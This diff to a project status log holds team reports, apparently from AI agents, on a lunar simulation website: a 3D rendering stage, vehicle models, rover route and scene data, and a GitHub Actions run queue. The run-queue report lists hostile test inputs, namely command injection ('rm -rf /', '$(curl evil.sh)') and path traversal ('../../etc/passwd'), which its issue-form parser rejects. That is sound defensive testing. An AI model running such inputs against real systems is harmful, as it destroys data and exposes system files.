@@ -2376,3 +2376,323 @@ memoryless_LARGE pass 0.972 box 0.972 {'none': 486, 'sensor': 11, 'timeout': 3} 
   - `experiments/phase4/run_phase4.py` and `tests/test_phase4_runner.py` show as modified in `git status`. They were committed with CRLF under `* text=auto eol=lf`. Their bytes equal HEAD exactly and `git diff` is empty; a renormalising commit would clear it.
   - `results/E21a_comms_autonomy.csv` is yours (the running Stage A).
 - **Questions for LEAD:** none.
+
+## F-31 DONE 11:26 | Shared 3D stage (site/src/stage/) + demo /design/stage/; F-30 follow-ups (theme button, Space Grotesk out, catalogue on /design/)
+- **Files changed:**
+  - New `site/src/stage/`: `stage.js` (createStage), `lighting.js`, `post.js`, `director.js`, `labels.js`, `cutaway.js`, `explode.js`, `pick.js`, `perf.js`, `tier.js`, `index.js`.
+  - Demo: `site/design/stage/index.html`, `site/src/design/{stage.js,stage.css,tank.js}`; `site/vite.config.js` (PAGES gets `design/stage/`).
+  - New `site/src/catalog.js`; `site/scripts/prepare-data.mjs` stages `lunarsim/catalog-v1.json` to `public/catalog/`.
+  - `/design/` (`index.html`, `src/design/{main.js,design.css}`): numbers now from the catalogue; the A/B control and Space Grotesk are removed.
+  - `site/src/styles/base.css`: theme button hidden on `body.instrument`.
+  - `site/src/ui/ui.css`: pressed style for `.ui-btn`.
+  - `site/package.json` + lock: camera-controls 3.1.2 (MIT), n8ao 2.0.1 (package.json says ISC; its LICENSE.md is CC0 1.0), postprocessing 6.39.5 (Zlib; only because n8ao imports its `Pass` at load); `@fontsource-variable/space-grotesk` removed.
+- **API** (`import { createStage, detectTier, TIERS } from 'site/src/stage/index.js'`):
+  - `await createStage({canvas, labelsHost, preset: 'exhibit'|'onsite', tier, ao: 'gtao'|'n8ao', sun: {az, el}, toneMapping, onStatus, onPick, onHover})` returns a stage:
+    - Fields: `scene`, `camera`, `renderer`, `director`, `labels`, `cutaway`, `lighting`, `post`, `stats`; getters `tier`, `paused`, `reversedDepth`, `gpuTimer`, `pixelRatio`, `size`.
+    - Settings: `setTier(1-3)`, `setAO(kind)`, `setToneMapping('neutral'|'aces'|'agx', exposure)`, `setPreset(name, {sun})` (async).
+    - Subject: `setSubject(object, {cutTargets})` returns its box (fits the shadow camera, cut, picking and labels); `setCut('off'|'plane'|'wedge', {facing, origin, halfAngle})` (async); `explode(parts)` returns `{t, set(t), to(t)}`.
+    - Loop: `animate(fn)` returns a cancel function; `pause(bool)`; `setAdaptive(bool)`; `renderOnce()`/`invalidate()`.
+    - Measurement and lifecycle: `measure(ms)` (rAF frame intervals), `benchmark(n)` (GPU timer + CPU per frame), `info()`, `loseContext()`, `dispose()`.
+  - `director`: `shot(name, {position, target} | {box, padding})`, `go(name, {instant})`, `limits({minDistance, maxDistance, minPolar, maxPolar, boundary})`, `nudge(az°, polar°)`, `zoom(f)`, `autoRotate(°/s)`, `bindKeys(canvas)` (arrows, +/−, Home).
+  - `labels`: `add({id, text, object, anchor, onSelect, tone})`, `setPressed(id)`, `show(bool)`.
+- **What it does:**
+  - Renderer: three r186 WebGLRenderer; stencil on; reversed depth when EXT_clip_control exists (true here); PCF shadows; tone mapping Neutral, ACES or AgX.
+  - Renders on demand: the loop sleeps when nothing moves; one frame per vsync (an early double-frame bug is fixed).
+  - Shader stalls: a cut or preset change compiles its new programs with KHR_parallel_shader_compile (`compileAsync`, capped at 3 s) before drawing. Before this fix, the first cut froze the page for **1.4 s** (wedge: 0.5 s); the longest main-thread gap afterwards was 73 ms.
+  - Presets:
+    - exhibit: RoomEnvironment PMREM plus a key and a cool fill light, on a dark floor.
+    - onsite: black sky; one sun at az/el (1.5° by default, intensity 10, so sunlit faces saturate as in lunar photos); a dim regolith-bounce PMREM; a procedural rolling regolith ground (labelled representative detail); Earth as a 1.9° disc at el 4° (placeholder azimuth until R-1). The shadow camera is fitted to the subject, so the 38×-height shadows read on the ground.
+  - Post-processing chain per tier:
+    - tier 1: render → output → FXAA.
+    - tier 2: GTAO at half resolution, 8 samples → bloom at half resolution → outline → output → FXAA.
+    - tier 3: GTAO at full resolution, 16 samples → full bloom → outline → output → SMAA.
+    - Composer buffers are half-float with a stencil buffer, so cutaway caps survive.
+    - Bloom threshold is per preset (exhibit 2.5, onsite 12 linear HDR), so only hot parts glow, never sunlit paint.
+  - Adaptive pixel ratio inside the tier's pixel budget. It ignores frame gaps over 250 ms (a throttled window, not a slow GPU) and stops after 4 flip-flops.
+  - Cutaway: stencil caps per part in the part's cap colour; half plane or wedge (clipIntersection, caps trimmed by the other plane turned round); `origin` puts the cut on a part's axis.
+  - GTAO's own normal pass ignored clipping planes and would draw the caps as whole quads. It is patched to take the planes and hide the cut helpers.
+  - Labels: the F-30 callouts at 3D anchors. They hide behind the camera, off screen, or when occluded (a ray every 4th frame; clipped hits and the label's own part do not count). Overlaps are pushed apart.
+  - Picking: hover outline with OutlinePass (tier ≥ 2) or an emissive tint (tier 1); a click picks a part; the callout buttons do the same from the keyboard.
+- **Measured** (this RTX 3050 laptop, Chrome/ANGLE D3D11, exhibit preset, default view, drawing buffer 1440×675 = 1152×540 css × 1.25 dpr, Neutral, 150 frames after a warm-up, mixed order, ms):
+
+  | Tier | AO | GPU p50 | GPU p95 | CPU p50 | CPU p95 | Draw calls |
+  |---|---|---|---|---|---|---|
+  | 1 | – | 0.54–0.61 | 0.60–0.69 | 0.4 | 0.5–0.7 | 27 |
+  | 2 | GTAO ½ | 0.82–0.97 | **1.18–1.26** | 0.7–0.8 | 0.9–1.0 | 69 |
+  | 3 | GTAO full | 1.92 | 2.09 | 0.8 | 1.2 | 71 |
+  | 2 | N8AO ½ | 1.92 | 2.41 | 0.8 | 1.7 | 46 |
+  | 3 | N8AO full | 1.94 | 2.09 | 0.8 | 1.1 | 47 |
+
+  - Worst case: with Chrome throttling the covered window to about 1 fps, the GPU stayed at idle clocks and read 3.5/5.5 (tier 1), 10.0/11.2 (tier 2) and 21.9/24.5 ms (tier 3). **Tier 2 p95 stays under 16.7 ms even then.**
+  - Frame interval at display refresh: **not measured.** This window never got full-rate frames (covered by another session's Chrome window; about 9 fps at best after the owner brought it up; 0.24–0.5 GB RAM free). F-40 should re-measure in a foreground window.
+- **AO chosen: GTAO.**
+  - At tier 2 it is about half N8AO's cost here (p95 1.2 vs 2.4 ms; N8AO's half-res mode saved nothing at this size); they are equal at tier 3.
+  - It ships with three (no download); N8AO adds an 83 kB gzip chunk plus `postprocessing` for one import.
+  - Both handle the reversed depth buffer (N8AO through its `depthBufferType: Reverse`).
+  - Against GTAO: it renders the scene a second time for normals (cost grows with geometry) and needed the cutaway patch; N8AO renders the real frame once, so cuts are right automatically.
+  - Recommendation: keep N8AO selectable on the demo until F-40 measures an Intel iGPU and a heavy scene, then drop n8ao and postprocessing if GTAO still wins.
+- **Checks:**
+  - Tiers 1–3 render.
+  - Whole, Cutaway (half and wedge) and Exploded work.
+  - Exhibit and on-site lighting work; the long shadows show on site.
+  - Labels: the liquid-oxygen label stays hidden until the tank is cut.
+  - Context loss → restore redraws the scene; the status line reports both.
+  - Reduced motion: explode jumps, camera moves are cuts, no turntable.
+  - Phone at 390 px (iframe): the view sits on top, the panels stack below, no horizontal scroll, the theme button is hidden.
+  - axe-core 4.14: 0 violations from the page (the only hit is the Claude extension's injected indicator).
+  - Console: no errors. One three.js warning on load: an ANGLE/D3D "X4122" precision note on three's own depth-packing constants, not our code.
+  - `npx vite build` clean: the demo chunk is 78 kB gzip (three shared); N8AO loads lazily only when chosen.
+  - /world/ and the labs import none of the new modules and the shared CSS changes only match `body.instrument` / `.ui-btn`, so they are unchanged by construction. I did **not** re-load them after F-31 (memory).
+  - The dev server, preview and axe server are stopped by PID (TaskStop had left the node children running); the browser tab is closed.
+- **F-30 follow-ups from your message:**
+  - The theme button is hidden on instrument pages.
+  - Space Grotesk is removed (dependency, A/B control, CSS import).
+  - The catalogue is staged and /design/ reads MK1 height 8.05 m, diameter 3.08 m and thrust **44 kN** (the catalogue's `gate.t_max_n`; the old specimen had 40). The shadow is computed from the catalogue height (Modelled).
+- **How to check:**
+  - Run `cd site && npm run dev` and open http://localhost:5173/design/stage/ (add `?tier=1|2|3` to force a tier).
+  - View: Whole/Cutaway/Exploded; Cut: Half/Wedge; Light: On site; switch Tier and AO; "Measure 150 frames" logs a row.
+  - "Simulate context loss".
+  - Keyboard: Tab to the canvas, then arrows, +/− and Home; Tab to a callout and press Enter.
+- **Known limits:**
+  - Shots are fixed positions, so on a phone's tall aspect the tank top is cropped. F-32 should use `{box}` shots (fitToBox).
+  - Cap faces get AO from the geometry behind them under GTAO (the caps are hidden from its normal pass). It looks fine on the test object; check on the vehicles.
+  - The tone-mapping A/B control is in place but not judged yet: per the plan it needs real vehicles.
+- **From BACKEND:** nothing new. B-30's `gate.t_max_n` and `dims.*` are what F-32 will read.
+- **Questions for LEAD:**
+  1. Keep n8ao + postprocessing until F-40's iGPU measurement (my proposal), or drop them now?
+  2. Log the foreground frame-interval measurement for F-40, together with the light-theme Tol marks?
+
+## F-32a REPORT (part a of F-32: the procedural vehicle kit; the page /vehicles/ follows as F-32b) | site/src/models/
+- **Files (new):**
+  - `site/src/models/index.js`: `buildVehicle(catalog, mats, id, {lod: 'full'|'simple'|'icon', count})`, `buildLOD()`, `GENERATORS`, `GROUPS`.
+  - `site/src/models/materials.js`: catalogue material map; MLI crinkle normal map generated in code; regolith dust on the lowest 40 cm by world height.
+  - `site/src/models/parts.js`: closed lathes, shells, tanks, bells, rings and struts; a builder with parts, explode axes, cut targets, flow paths and triangle counts.
+  - `site/src/models/{landers,rovers,base}.js`: one generator per catalogue id (CLPS, MK1, LARGE, LTV, HAUL, MICRO, habitat, pad, solar_tower, comms_mast, cargo_pallet instanced, apollo_lrv) plus `astronaut()` (1.8 m).
+- **Each vehicle returns:**
+  - Named parts (label, explode axis and distance, `representative` flag and note).
+  - Cut targets (closed meshes, outer first).
+  - Flow paths for Follow (propellant, power, cargo).
+  - Triangle count and bounding box.
+  - Representative parts carry the catalogue's reason in their note: MK1 and HLS-class legs, the HLS airlock and elevator and landing thrusters, the LTV solar panel and arm, all of HAUL (concept).
+- **Measured against the catalogue** (Node, three r186, full level; pallets and cargo excluded from rover sizes; span = foot-pad edge to edge):
+
+  | id | measured (m) | catalogue (m) | triangles full / simple |
+  |---|---|---|---|
+  | CLPS | height 3.94, span 3.60 | height 3.938, leg span 3.6 | 5,592 / 2,304 |
+  | MK1 | height 8.05, span 6.89 | height 8.05, leg span 6.9 | 11,416 / 4,020 |
+  | LARGE | height 52.00, span 20.00 | height 52, leg span 20 | 30,384 / 10,560 |
+  | LTV | 3.98 × 2.25 × 2.60 | 4 × 2.3 × 2.6 | 6,028 / 1,644 |
+  | HAUL | 7.14 × 3.85 × 2.49 | 7 × 4 × 2.5 (Assumed) | 7,872 / 1,440 |
+  | MICRO | 1.73 × 1.61 × 2.47 | 1.7 × 1.7 × 2.5 | 5,332 / 1,044 |
+  | habitat | shell 15.6 × 8.4 (+ representative airlock and radiators: 17.7 × 9.3 overall) | 15.6 × 8.4 | 4,596 / 1,716 |
+  | pad | disc 54; berm out to 79.9 (berm radius 37.5 + half base 2.45) | 54; berm per catalogue | 1,344 / 448 |
+  | solar_tower | 10.0 tall, array 7.2 wide | 10, array 7.1 | 184 / 80 |
+  | comms_mast | 17.0 | 17 | 1,524 / 618 |
+  | cargo_pallet | 1.56 × 1.06 × 1.00 (with frame) | 1.5 × 1 × 1 | 24 |
+  | apollo_lrv | 3.12 × 1.14 | 3.1 × 1.14 | 3,908 / 772 |
+
+  - Every full-level count is ≤ 60k (largest: LARGE at 30k).
+  - HAUL width follows the catalogue track 3.4 m plus the wheel width (3.85); the catalogue's 4 m would need a wider track. Your call.
+- **Not yet checked:** rendering in the browser, Cutaway caps and Exploded on the kit. These come with the /vehicles/ page (F-32b), which is in progress.
+- **Questions for LEAD:** HAUL width: keep track 3.4 m (3.85 m overall) or widen to 4 m?
+
+## B-32 DONE 11:36 | Rover route geometry for the 3D views (lunarsim-routes v1)
+- **Files:**
+  - `lunarsim/rover/routes.py`: new; `python -m lunarsim.rover.routes`.
+  - `lunarsim/schemas/routes-v1.schema.json`: new.
+  - `tests/test_rover_routes.py`: new, 5 tests.
+  - **Data for LEAD to commit:** `data/driving/routes-v1.json`, **3.32 MiB (3.48 MB; gzip 0.35 MB)**, within the 4 MB budget.
+- **Content:** every directed leg of `driving-v1.json` (182, pads at all five standoffs) × lighting {0, 90, 180, 270, night} = **910 routes**.
+  - Each is the expert's planned A* route with the tables' own cost grid and lighting (`expert.plan` with the same `sun` values; night = the slope-only route of B-40).
+  - **868 distinct geometries, 264,348 vertices.** Lighting changes the route in most cases, so a geometry shared by lighting cases is stored once.
+- **Per route:**
+  - Vertices ≤ 10 m apart (10.04 m after rounding to the 0.1 m grid); every A* corner kept; each corner-to-corner segment split into equal parts.
+  - z from the 5 m grid (`Terrain.height`; FRONTEND adds the wheel radius).
+  - Cumulative distance: the reader sums the decoded segment lengths, which saved 1 MB. It differs from the exact length by at most 5 mm.
+  - The cumulative **time fraction** f (0 → 1) from the integrator's speed model: slope factor × lighting factor (shadow, up-sun) × (1 − slip at φ 42°), with dig-in stretches taking no time, as in `tables.drive_profile`. The table's expected time T spreads as t = f T.
+- **Encoding** (columnar integers, delta; documented in the file and the schema):
+  - geometry: `x0, y0, z0` + `dx, dy, dz` in decimetres;
+  - route: `geom` index + `df` in 1e-4 units (sum 10000) + `length_m` + `table_length_m`.
+  - Decoder: `routes.decode_geom` / `decode_f`.
+- **Length check against the table's `route.length_m`: max |difference| 0.049 m** over all 910 routes (the table rounds to 0.1 m).
+- **Run:** 242 s, single process, **peak RSS 353 MB**. The spike comes from loading the terrain pack (the 5 m grid in float64); steady state 120 MB. I ran it once while 0.27 GB was free; sorry if E21 felt it.
+- **Tests:**
+  - A* is straight on a flat grid (axis and diagonal).
+  - Resampling keeps the corners, drops repeated vertices, keeps the length, and spaces ≤ 10 m.
+  - Time fractions: uniform speed gives f = s/L, a slower half shifts f, and they end at 1.
+  - Encode/decode round trip.
+  - The committed file: validates, 182 × 5 routes, length check, pads at every standoff.
+  - `test_rover_routes.py` + `test_rover.py`: 24 passed, 1 skipped (jsonschema). JSON Schema checked separately: 0 errors.
+- **How to test:** `.venv\Scripts\python -m pytest tests\test_rover_routes.py -q`. Rebuild: `python -m lunarsim.rover.routes` (~4 min).
+- **For FRONTEND:** `legs["PAD_A@1->BASE"]["night"]` → `geom`, `df`. Decode as in the schema description. Local frame, x east / y north from the tile's south-west corner (the same as sites.json).
+- **Questions for LEAD:** none.
+
+## B-31 DONE 11:47 | Scene package lunarsim-scene v1 (what a 3D replay of a year needs)
+- **Files:**
+  - `lunarsim/scene.py`: new. `build(trace_v2, out_dir)`, Python reader `read` / `position` / `replay_counts`, CLI `python -m lunarsim.scene --trace F | --scenario S [Phase-3 flags] [--comms ...] --out DIR`.
+  - `lunarsim/schemas/scene-v1.schema.json`: the index, documented for the JS reader.
+  - `tests/test_scene.py`: new, 6 tests.
+  - `tools/comms/earth_link.py`: new stage `track`.
+  - **Data for LEAD to commit:**
+    - `data/scenes/{P1, P2, P3, P2V2, P2-comms-dte}/`: each is `scene.json` + `routes.bin` + 13 × `chunk_NNN.bin`; 5.6 MB raw in total.
+    - `data/comms/connecting_ridge/earth_track-v1.json.gz` (71 KB): hourly Earth elevation, apparent radius and grid bearing at BASE, 2028-2031, from SPICE.
+    - **Please add `*.bin binary` to `.gitattributes`.** The rule `* text=auto eol=lf` must not touch float32 files.
+- **Format** (the full description is in the schema):
+  - The index plus little-endian float32 binaries: 30-day chunks of segments and hourly series, and `routes.bin`.
+  - **Vehicles are a gap-free timeline of segments**, not dense keyframes: `veh, job, t0, t1, x0..z1, route, f0, f1, load_kg, state, heading`.
+    - A drive follows the B-32 planned route for its leg and its lighting at start, with f linear in time.
+    - The routes used are copied into `routes.bin`, simplified by RDP at 0.5 m.
+    - Dense keyframes would be ~40 MB a year; segments on routes keep every package under 0.3 MB gzipped.
+  - Segments are split at chunk boundaries and at every Earth-link wait.
+  - States: idle, driving, loading, team_lift, parked_night, standdown, waiting_for_earth, failed.
+  - Landing events carry |miss|, outcome, cargo and the **nearest B-33 trajectory episode** (classical law of that class; a failed landing → the first-failure episode). Also: keep-out windows, nights, deliveries (t, site, kg), the job list, comms settings and `comms_waits`.
+  - Hourly series per chunk: sun azimuth (the scenario's model, as phase3), night flag, Earth elevation / radius / bearing at BASE (earth_track; the comms start year), and items + kg waiting at each site.
+- **Assumed mapping, stated in the docstring** (the trace does not label stationary segments):
+  - a job's first stationary segment of positive length = a keep-out hold, or an Earth wait if `comms_waits` has it;
+  - a second stationary segment after the final unload = the job's tail extension: night hibernation if it overlaps a night and the vehicle cannot work at night, else fault recovery;
+  - other stationary segments and gaps inside a job = loading;
+  - team members other than the lead mirror the lead's timeline, with their own approach leg;
+  - pad↔pad legs (no planned route) are straight lines.
+- **Determinism:** two builds of the same trace give byte-identical files (test, sha256 of every file).
+- **Reproduction checks:**
+  - Trips (non-reposition jobs present in the segments) = the trace's job count = summary `jobs`.
+  - Landings = the trace's landing count.
+  - Delivered kg = the trace's cargo table **exactly**. The trace rounds masses to 0.1 kg, so it differs from the engine's summary by ≤ 0.6 kg in a year.
+
+  | Sample | Scenario | Trips | Landings | Delivered t (cargo table / summary) | Segments | Routes | gzip MB |
+  |---|---|---|---|---|---|---|---|
+  | P1 | P1-default | 69 | 3 | 33.5962 / 33.5961 | 474 | 27 | 0.12 |
+  | P2 | P2-default | 545 | 6 | 530.3280 / 530.3279 | 2,994 | 101 | 0.18 |
+  | P3 | P3-default | 1,694 | 9 | 1,619.3008 / 1,619.3013 | 8,853 | 142 | 0.26 |
+  | P2V2 | P2-4-vehicles | 533 | 6 | 530.3280 / 530.3279 | 2,815 | 99 | 0.18 |
+  | P2-comms-dte | P2-default, comms dte | 308 | 6 | 302.2047 / 302.2048 | 1,712 | 30 | 0.13 |
+
+  - All samples were simulated with seed 3, marketplace, `--terrain connecting_ridge --pad-standoff 1 --landing-model classical --plume 1,0.5 --autonomy driving-v1` (the settings of the committed v2 sample).
+  - All five are under the 2 MB gzip limit. The dte sample contains waiting_for_earth segments.
+- **Checks in the tests:**
+  - Every vehicle's segments cover 0-8,760 h with no gap (< 1e-3 h, float32) and no position jump (< 5 cm).
+  - A drive starts at its origin site and ends at its destination.
+  - Segments lie inside their chunk.
+  - The hourly waiting counts equal a direct count from the cargo table.
+  - Earth's elevation swings −7.5…+6.2° at the pole.
+  - The sample packages: sha256 matches, the reproduction checks hold, and every index validates against the JSON Schema (0 errors; jsonschema from a scratch folder).
+- **Runs:** each sample is one process of ~6 s; packaging takes under 1 s.
+- **How to test:**
+  - `.venv\Scripts\python -m pytest tests\test_scene.py -q` (6 passed).
+  - Rebuild one: `python -m lunarsim.scene --scenario P2-4-vehicles --seed 3 --terrain connecting_ridge --pad-standoff 1 --landing-model classical --plume 1,0.5 --autonomy driving-v1 --out data/scenes/P2V2`
+- **For FRONTEND:** read `scene.json` and the chunk for the current time. Position on a drive = interpolate `routes.bin` item `route` at f = f0 + (f1 − f0)(t − t0)/(t1 − t0) (x, y, z by the route's f column). Stationary segments sit at (x0, y0, z0). `scene.position()` is the reference implementation.
+- **Questions for LEAD:** none (just the `.gitattributes` line).
+
+## F-32 DONE 11:45 | Vehicle kit (F-32a, reported above) + the /vehicles/ exhibit page (F-32b); your F-31 answers applied
+- **Files changed (F-32b):**
+  - New page: `site/vehicles/index.html` (`body.instrument`) and `site/src/vehicles/{main.js,stories.js,flows.js,vehicles.css}`.
+  - Nav: `site/lib/pages.mjs` gets "Vehicles" after World; `site/vite.config.js` gets the page entry.
+  - Shared code:
+    - `site/src/stage/stage.js`: `clearSubject()`; final occlusion check when the loop goes idle.
+    - `site/src/stage/labels.js`: `clear()`; forced occlusion check.
+    - `site/src/ui/chip.js`: worded values such as "parks in the dark", with flag and source; the first render always happens.
+    - `site/src/ui/door.js`: `beforeOpen` (Enter starts the work); sizes shown in kB below 1 MB.
+    - `site/src/catalog.js`: `fetchFn`, so the door counts the catalogue's bytes.
+  - Kit:
+    - `site/src/models/parts.js`: label anchors on each part's outer side, so shells are not hidden by their own contents.
+    - `site/src/models/rovers.js`: HAUL wheels 0.6 m wide, per your answer; measured width is now **4.00 m**.
+- **The page:**
+  - Scene chips (Landers · Rovers · Base, then one chip per vehicle); deep link `?v=ID`.
+  - View: Whole / Cutaway (stencil caps) / Exploded.
+  - Follow: Propellant (cyan) / Power (amber) / Cargo (green). Dashed tubes move along the kit's flow paths and are drawn through the hull; they stand still under reduced motion.
+  - Narrative card per vehicle × mode, with every number a `{{path}}` catalogue lookup rendered by num() with flag and source.
+  - Stat chips, e.g. LTV "Carries 1.5 t · Speed 6 km/h · Night parks in the dark", each flagged Modelled with its catalogue source.
+  - 4–6 callouts per vehicle (buttons; occlusion-aware: internal tanks appear when cut).
+  - Parts list (component tree, `<details>`, collapsible on phones) and a properties panel: size measured on the model (flagged Modelled), catalogue material description, triangles, the representative note.
+  - "Representative model" label with a tooltip whenever the catalogue or a part says so.
+  - Scale references: the 1.8 m astronaut and the Apollo LRV (toggle).
+  - Camera shots from the bounding sphere, which does what your {box} answer asks: a 1.7 m rover and a 52 m lander both fill the view, phone aspect included.
+  - Pause button; tier 0 shows the numbers and parts list without 3D.
+  - Loading door: real byte progress for the catalogue, then "Enter the 3D view" builds the stage ("Starting the 3D view…") and opens.
+  - Why the Enter gate: without it, the WebGL set-up and shader compiles ran before any visitor action and pushed Lighthouse performance down to **65** (TBT 2.1 s).
+- **Checks:**
+  - Every catalogue vehicle renders at catalogue size: see the F-32a table. MK1 and LARGE leg spans 6.89 / 20.00 m, heights 8.05 / 52.00 m; HAUL now 7.15 × 4.00 × 2.50 m.
+  - Cutaway shows solid caps (MK1: hydrogen and oxygen tank sections). Exploded separates the parts (LARGE: tanks rise out of the hull, legs, elevator and thrusters move clear).
+  - **Frame cost at the default view** (RTX 3050, 1440×650, GPU timer queries, 150 frames, p50/p95 ms):
+
+    | Vehicle | Tier | GPU p50/p95 | CPU p50/p95 |
+    |---|---|---|---|
+    | MK1 | 1 | 0.30/0.56 | — |
+    | MK1 | 2 | 1.53/2.53 | 1.00/1.70 |
+    | LARGE (heaviest) | 1 | 0.51/2.69 | — |
+    | LARGE | 2 | 1.63/2.69 | 1.30/1.90 |
+    | LARGE | 3 | 2.57/4.23 | 1.40/2.70 |
+
+    So tier 1 sits far below 33 ms (≥ 30 fps) and tier 2 p95 far below 16.7 ms. The display-rate frame interval again could not be measured (Chrome window covered and throttled); **noted for F-40**, as you agreed, with the light-theme Tol marks.
+  - **Lighthouse 13.5.0 desktop**, production build, `/vehicles/?v=MK1`: **performance 93, accessibility 100, best practices 100** (LCP 0.7 s, TBT 210 ms, CLS 0.04).
+  - Keyboard: a 24-Tab walk reaches groups, vehicles, canvas (arrows, +/−, Home), callouts, the representative label, flags, camera, View/Follow, Scale and Pause.
+  - 390 px (iframe): the view sits on top, then story, chips, controls and panels stacked; no horizontal scroll.
+  - Console: no errors. The only messages are three.js's own ANGLE shader-compiler warnings (X3595/X4000 in its FXAA shader; X4122 seen before).
+  - The production Enter flow works.
+  - Dev and preview servers are stopped by PID; the Chrome tab is closed.
+- **Known limits:**
+  - In tab order the callout buttons come before the story card (DOM order); the stage demo already puts the HUD first, and /vehicles/ can follow in F-40.
+  - Flow paths are drawn by hand per generator (feed lines, cables, load path); they show routes, not plumbing detail.
+  - Base elements have no propellant path, and the card says so when Follow is on.
+- **From BACKEND:** nothing for F-32. Noted: `data/driving/routes-v1.json` (B-32) for F-35/F-36 and `data/policies/trajectories-v1.json` (B-33) for F-34.
+- **Questions for LEAD:**
+  1. OK with "Enter the 3D view" as the start of the 3D build? The page text, numbers and parts list render before it; Lighthouse performance 93 vs 65 without the gate.
+
+## B-37 DONE 11:52 | The backend inside the GitHub repository: a run queue on GitHub Actions
+- **Files (all new; LEAD reviews before merge):**
+  - `.github/ISSUE_TEMPLATE/run-scenario.yml`: the issue form. 13 fields: phase, fleet preset, job rule, terrain models on/off, pad standoff, keep-out radius, night share, round-trip delay, operators, Earth link (off / always / dte / dte+relay 0.5/0.8/0.9 / dte + BASE mast), supervised policy, seeds 1-30, purpose.
+  - `.github/workflows/run-scenario.yml`
+  - `tools/actions/run_issue.py`
+  - `tools/actions/sample_issue.md`
+  - `tests/test_run_issue.py`: 22 tests.
+  - No secrets, no data files.
+- **Flow:**
+  1. A visitor opens an issue with the form; it gets the `run-pending` label.
+  2. LEAD looks and adds `run-request`. Adding labels needs triage access, so strangers cannot start runs.
+  3. The workflow runs (`issues: labeled`, only for `run-request` on an open issue) with `concurrency: run-queue` (one at a time, none cancelled), `timeout-minutes: 60`, `permissions: {}` at the top and per job only `contents: write` (the release), `issues: write` (the comment) and `actions: write` (dispatching pages).
+  4. **The issue body goes in through an environment variable only**; no `${{ }}` holding user text appears inside a shell line.
+  5. `run_issue.py` parses the form **strictly**:
+     - every heading must be a form label, once, with an allowed value: choices from fixed lists, numbers in fixed ranges, whole numbers where needed;
+     - an edited body, an extra section, text before the first section, a path, a shell fragment or a range violation → `error.md` and exit 2;
+     - the purpose is never interpreted: truncated to 500 characters, @-mentions defused, HTML and markdown escaped, quoted.
+  6. It runs `lunarsim` (one year per seed, seeds 0…n−1) with the same provenance block the service records (`service/provenance.py`: engine version, git sha, dirty flag, lock sha, python, platform; plus the shas of every data file read, including the Earth-link files when comms is on, and the Actions run id).
+  7. It writes:
+     - `summary.json`: request, effective scenario (full form) and its canonical sha256 (as the service computes it), per-seed summaries, mean and 95 % CI of the headline metrics, provenance;
+     - `trace_seed0.json.gz`;
+     - `scene.tar.gz` (the B-31 scene package, when the terrain models are on);
+     - `comment.md` and `release_notes.md`.
+  8. The release `run-<issue>` is a prerelease at the run's commit; nothing is committed to main. Then the summary comment, then `gh workflow run pages.yml`. On failure, `error.md` (or a log link) is commented.
+- **Browser access, checked: release asset URLs do NOT allow browser fetches.** github.com answers the download with a 302 to release-assets.githubusercontent.com, and neither response carries `Access-Control-Allow-Origin` (tested with an Origin header). So **runs are published into the Pages artifact instead**: the release stays as durable storage, and pages.yml copies every `run-*` release into `runs/<id>/` of the site at each deploy. The site then opens `/world/?run=<id>` from its own origin.
+- **Dry run** (`python tools/actions/run_issue.py --body-file tools/actions/sample_issue.md --issue 0 --out <dir>`): the sample is P2 4 vehicles, marketplace, terrain on, pads 1 km, keep-out 1 km, dte, strategic+avoid, 2 seeds.
+  - 27 s.
+  - Files: summary.json (11 KB), trace_seed0.json.gz (32 KB), scene.tar.gz (148 KB).
+  - The comment is a table of 9 headline metrics with ±CI, the escaped purpose, links to the release and `/world/?run=0`, and a provenance line. It reports 312.9 t/yr delivered, urgent p90 402 h, 124 vehicle-h waiting for Earth.
+- **Tests:** `.venv\Scripts\python -m pytest tests\test_run_issue.py -q`, 22 passed:
+  - the sample and every comms / terrain variant map to the right Scenario;
+  - 16 rejections (seeds 0/31/2.5, rtt −1/31, night 0.9, `1e3`, P4, `marketplace; rm -rf /`, `$(curl evil.sh)`, `../../etc/passwd`, an injected `### Extra` section, a missing field, a P3 fleet preset, keep-out without terrain, a two-line value);
+  - edited bodies (duplicate section, text before the form, a renamed heading);
+  - purpose escaping and truncation;
+  - exit code 2 with error.md;
+  - a small terrain-off pipeline run (summary, trace, provenance keys, comment links).
+  - The form's labels and dropdown options are checked equal to the parser's lists (YAML parsed).
+- **Steps for LEAD to enable it:**
+  1. Review and commit the five files above.
+  2. Create the labels: `gh label create run-request --color B60205 --description "Approved: run on Actions"` and `gh label create run-pending --color FBCA04 --description "Run request awaiting a look"`.
+  3. In **pages.yml** (yours), add before `upload-pages-artifact`:
+     ```yaml
+           - name: Published runs (run-* releases) into the site
+             env: { GH_TOKEN: "${{ github.token }}" }
+             run: |
+               mkdir -p site/dist/runs
+               for tag in $(gh release list --limit 200 --json tagName --jq '.[].tagName | select(startswith("run-"))'); do
+                 d="site/dist/runs/${tag#run-}"; mkdir -p "$d"
+                 gh release download "$tag" --dir "$d" --pattern 'summary.json' --pattern 'trace_seed0.json.gz' --pattern 'scene.tar.gz'
+                 if [ -f "$d/scene.tar.gz" ]; then tar -xzf "$d/scene.tar.gz" -C "$d" && rm "$d/scene.tar.gz"; fi
+               done
+     ```
+     `workflow_dispatch` is already a trigger. `contents: read` is enough to list and download releases.
+  4. Settings → Actions → General: leave "Allow GitHub Actions to create and approve pull requests" off (not needed). The workflow asks for its own permissions per job; the repository default may stay read-only.
+  5. FRONTEND: `/world/?run=<id>` reads `runs/<id>/scene/scene.json` (+ chunks), `runs/<id>/summary.json` and `runs/<id>/trace_seed0.json.gz`.
+  6. Try it: open an issue with "Run a scenario" (e.g. P1, terrain on, 2 seeds), add `run-request`, and watch Actions. Expect a comment in ~1 min, release `run-<n>`, and the site in a few minutes.
+- **Limits:** seeds ≤ 30 and one year each. The slowest case (P3, terrain on, dte, 30 seeds) should take ~5-10 min against the 60 min limit; `--max-seconds 3300` also stops the runner itself before the job limit.
+- **Questions for LEAD:** none.
